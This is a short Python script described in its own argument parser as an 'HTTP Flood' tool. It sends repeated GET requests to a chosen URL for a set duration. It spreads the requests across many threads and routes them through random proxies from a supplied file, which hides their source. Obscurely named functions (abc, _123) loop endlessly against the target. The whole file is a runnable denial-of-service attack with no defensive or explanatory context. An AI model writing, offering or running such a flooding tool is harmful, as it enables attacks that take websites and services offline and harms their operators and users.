import requests
import time
import concurrent.futures
import argparse
import random

def abc(url, proxy):
    try:
        response = requests.get(url, proxies={'http': proxy, 'https': proxy})
        return response.status_code
    except Exception as e:
        return str(e)

def _123(url, proxy):
    while True:
        status_code = abc(url, proxy)
        print(f'Status code: {status_code}')
        time.sleep(5)

def main(url, duration, num_threads, proxy_file):
    with open(proxy_file, 'r') as file:
        proxies = [line.strip() for line in file]

    start_time = time.time()
    with concurrent.futures.ThreadPoolExecutor(max_workers=num_threads) as executor:
        while time.time() - start_time < duration:
            proxy = random.choice(proxies)
            executor.submit(_123, url, proxy)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='HTTP Flood')
    parser.add_argument('url', type=str, help='URL')
    parser.add_argument('duration', type=int, help='time')
    parser.add_argument('num_threads', type=int, help='threads')
    parser.add_argument('proxy_file', type=str, help='proxy')

    args = parser.parse_args()

    main(args.url, args.duration, args.num_threads, args.proxy_file)
